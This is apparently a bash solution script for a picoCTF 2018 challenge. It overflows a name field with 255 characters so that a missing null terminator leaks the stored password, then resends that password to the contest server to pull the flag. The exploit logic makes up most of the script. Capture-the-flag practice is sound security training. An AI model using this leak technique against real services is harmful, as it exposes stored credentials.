#!/bin/bash

# don't add th '\00' at the end of name variable
# when name with be displayed, password will alos be
# bacause the '\00' is at the end of password and not name

USERNAME='BLABLA'
PASSWORD=$(echo `python3 -c "print('A'*255)"` | nc 2018shell.picoctf.com 31045 | grep -oP "(?<=,).*")

echo -e "$USERNAME\n$PASSWORD\n" | nc 2018shell.picoctf.com 31045 | grep -oE 'picoCTF{.*}'
